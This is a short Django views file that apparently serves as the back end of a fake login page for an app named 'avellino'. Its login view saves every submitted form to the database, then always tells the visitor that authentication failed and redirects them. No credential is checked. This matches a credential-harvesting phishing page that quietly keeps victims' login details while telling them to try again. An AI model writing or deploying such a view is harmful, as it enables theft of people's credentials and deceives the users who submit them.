from django.shortcuts import render
from django.http import HttpResponseRedirect
from .forms import PostForm
from django.contrib import messages

def home(request):
    return render(request, 'avellino/home.html')

def login(request):
    form = PostForm()
    if request.method == 'POST':
       form = PostForm(request.POST)
       if form.is_valid():
            form.save()
            messages.add_message(request, messages.INFO, 'Authentication failed. The information you have provided cannot be authenticated. Check your login information and try again.')
            return HttpResponseRedirect('/')
    context = {'form': form}
    return render(request,'avellino/home.html', context)
    